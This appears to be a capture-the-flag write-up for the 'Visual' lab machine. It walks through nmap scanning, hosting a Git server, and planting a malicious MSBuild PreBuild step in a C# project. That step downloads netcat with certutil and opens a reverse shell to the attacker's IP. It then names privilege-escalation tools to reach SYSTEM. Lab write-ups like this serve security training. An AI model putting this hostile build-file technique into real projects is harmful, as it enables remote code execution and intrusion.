# Visual

<figure><img src="../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

IP of kali machine: 10.10.15.101

## Scanning

### Nmap

```bash
nmap -A -T4 -p- -v -sC visual.htb
```

```bash
Nmap scan report for visual.htb (10.10.11.234)
Host is up (0.050s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   48.74 ms 10.10.14.1
2   49.78 ms visual.htb (10.10.11.234)

NSE: Script Post-scanning.
Initiating NSE at 04:41
Completed NSE at 04:41, 0.00s elapsed
Initiating NSE at 04:41
Completed NSE at 04:41, 0.00s elapsed
Initiating NSE at 04:41
Completed NSE at 04:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.59 seconds
           Raw packets sent: 131236 (5.778MB) | Rcvd: 331 (59.448KB)
```

### HTTP

<figure><img src="../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

Fuzzing directories reveal only uploads directory:

<figure><img src="../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

Try to upload a git project to test webapp:

<figure><img src="../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

After submit of GIT link we have a redirect to URL with this pattern:  [http://visual.htb/uploads/ae27098c16b9bddc8abd36eb1c64cc/](http://visual.htb/uploads/ae27098c16b9bddc8abd36eb1c64cc/)

### Info

* PHP 8.1.17
* Apache 2.4.56
* Windows Server 2019

## Gaining Access

Github url seems to not work, so create a GIT server and expose it using Apache on Kali linux attacker machine.

1. Install Git and Apache:\
   `sudo apt install git apache2 apache2-utils`
2. Configuring Apache HTTP Server for Git:\
   `sudo a2enmod env cgi alias rewrite`
3. Create a new directory /var/www/git for keeping all the Git repositories:\
   `sudo mkdir /var/www/git`
4.  Create a new Apache site configuration /etc/apache2/sites-available/git.conf for Git:\
    `sudo nano /etc/apache2/sites-available/git.conf`

    ```xml
    <VirtualHost *:80>
    ServerAdmin webmaster@localhost

    SetEnv GIT_PROJECT_ROOT /var/www/git
    SetEnv GIT_HTTP_EXPORT_ALL
    ScriptAlias /git/ /usr/lib/git-core/git-http-backend/

    Alias /git /var/www/git

    <Directory /usr/lib/git-core>
    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
    AllowOverride None
    Require all granted
    </Directory>

    DocumentRoot /var/www/html

    <Directory /var/www>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride None
    Require all granted
    </Directory>


    ErrorLog ${APACHE_LOG_DIR}/error.log
    LogLevel warn
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    </VirtualHost>
    ```
5. Disable the default Apache site configuration:\
   `sudo a2dissite 000-default.conf`
6. Enable the Git site configuration:\
   `sudo a2ensite git.conf`
7. Restart Apache HTTP server\
   `sudo systemctl restart apache2`
8.  In order to bootstrap a new Git repository accessible over the Apache HTTP server, you will have to run a few commands. You don’t want to do the same thing over and over again just to create a new Git repository. So, I decided to write a shell script for that purpose.\
    `sudo nano /usr/local/bin/git-create-repo.sh`

    ```bash
    #!/bin/bash

    GIT_DIR="/var/www/git"
    REPO_NAME=$1

    mkdir -p "${GIT_DIR}/${REPO_NAME}.git"
    cd "${GIT_DIR}/${REPO_NAME}.git"

    git init --bare &> /dev/null
    touch git-daemon-export-ok
    cp hooks/post-update.sample hooks/post-update
    git config http.receivepack true
    git update-server-info
    chown -Rf www-data:www-data "${GIT_DIR}/${REPO_NAME}.git"
    echo "Git repository '${REPO_NAME}' created in ${GIT_DIR}/${REPO_NAME}.git"
    ```
9. Add execute permission to the shell script:\
   `sudo chmod +x /usr/local/bin/git-create-repo.sh`
10. Create a new Git repository test in the Git project root `/var/www/git` using the `git-create-repo.sh`:\
    `sudo git-create-repo.sh evil`
11. Now you can clone the test Git repository as follows:\
    `git clone http://ip.of.kali.machine/git/evil.git`

### Prepare evil code

A quick review of Visual Code documentation revealed that it is possible to execute a predefined command before the actual build happens.

MSBuild's PreBuildEvent can be manipulated to execute custom commands before the actual build process starts. This is done by defining a custom target (PreBuild) that runs before the PreBuildEvent.\
Create a simple C# console project in Visual Studio and then modify the Pre-build event as follow:

<figure><img src="../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

```xml
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="certutil.exe -urlcache -f http://10.10.15.101:8000/nc.exe nc.exe&#xD;&#xA;.\nc.exe -e cmd.exe 10.10.15.101 9999" />
  </Target>

</Project>
```

### Prepare exploit tools

Run a python server inside `/usr/share/windows-resources/binaries` in order to deliver netcat to windows machine:

```bash
python3 -m http.server
```

### Prepare the Evil git repository

1. Copy evil directory from Visual Studio Code project on Kali Machine
2.  Copy all the contents from evil directory to evil.git directory:\
    `cp -Rf /home/kali/Downloads/evil/* evil.git`\


    <figure><img src="../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>
3. Temporary change ownership of evil.git:\
   `chown -Rf root:root evil.git`
4. Initialize git inside evil.git:\
   `git init`\
   `git checkout -b main`\
   `git add .`\
   `git config user.email "test@test.com"`\
   `git config user.name "test"`\
   `git commit -m "first commit"`
5.  Now we can upload it!\
    \


    <figure><img src="../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

The payload force the Apache to grab netcat and then we will obtain a reverse shell:\


<figure><img src="../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Typically, web and database services possess "ImpersonatePrivilege" permissions. These permissions can potentially be exploited to escalate privileges. Given that a PHP application is running on this machine, I decided to upload and trigger a PHP reverse shell inside`C:\xampp\htdocs\uploads.`

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

Inspecting the privileges, I noticed the absence of `ImpersonatePrivilege`:

<figure><img src="../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

Upon further research, I came across FullPowers.&#x20;

{% embed url="https://github.com/itm4n/FullPowers" %}

This tool allows the recovery of the default privilege set for `LOCAL or NETWORK SERVICE` accounts:

<figure><img src="../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

With the required privileges in hand, I turned to

{% embed url="https://github.com/BeichenDream/GodPotato" %}

a tool known for elevating a service user with low privileges to `NT AUTHORITY\SYSTEM` privileges:

<figure><img src="../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

And finally we will get root flag:

<figure><img src="../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>
